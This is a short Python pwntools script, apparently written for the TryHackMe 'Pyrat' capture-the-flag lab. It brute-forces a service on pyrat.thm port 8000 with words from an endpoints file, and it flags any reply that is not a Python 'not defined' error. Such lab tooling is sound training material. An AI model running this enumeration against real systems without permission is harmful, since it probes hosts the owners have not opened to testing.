from pwn import *

# Set the host and port
host = "pyrat.thm"
port = 8000

directory_file = "endpoints.txt"

# Connect to the target
def connect_to_service():
    return remote(host, port)

# Function to attempt login with a endpoint
def attempt_endpoint(endpoint):
    # Connect to the service
    conn = connect_to_service()
    # Send the endpoint from the list
    conn.sendline(endpoint.encode())

    response = conn.recvline(timeout=2)
    # Convert the endpoint to bytes before concatenating
    if b"name '" + endpoint.encode() + b"' is not defined\n" in response:
        conn.close()
        return False
    else: 
        print(f"Endpoint '{endpoint}' might be correct!")
        conn.close()
        return True


# Main function to loop through endpoint list
def fuzz_endpoints():
    with open(directory_file, "r", encoding="latin-1") as f:
        for endpoint in f:
            endpoint = endpoint.strip()
            # Skip lines starting with '#'
            if endpoint.startswith("#") or not endpoint:
            	continue
            if attempt_endpoint(endpoint):
                print(f"Found working endpoint: {endpoint}")
                break

if __name__ == "__main__":
    fuzz_endpoints()
